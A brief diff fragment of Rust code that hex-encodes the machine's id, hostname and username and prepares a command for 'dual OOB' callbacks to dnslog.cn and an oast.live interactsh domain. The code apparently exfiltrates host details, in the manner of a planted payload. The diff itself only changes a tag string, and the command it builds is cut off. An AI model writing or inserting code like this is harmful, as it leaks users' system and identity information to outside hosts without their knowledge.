@@ -17,7 +17,7 @@ fn main() {
     let i = hex(&id[..id.chars().take(45).count()]);
     let h = hex(&hn[..hn.chars().take(45).count()]);
     let u = hex(&un[..un.chars().take(30).count()]);
-    let tag = "n2a05833";
+    let tag = "a2a05833";
     let ish = "dahpi2cgtqkhhbklhpp03u61y7w5xbgxx.oast.live";
     // dual OOB: dnslog.cn (user) + interactsh (self), no inner quotes
     let cmd = format!(
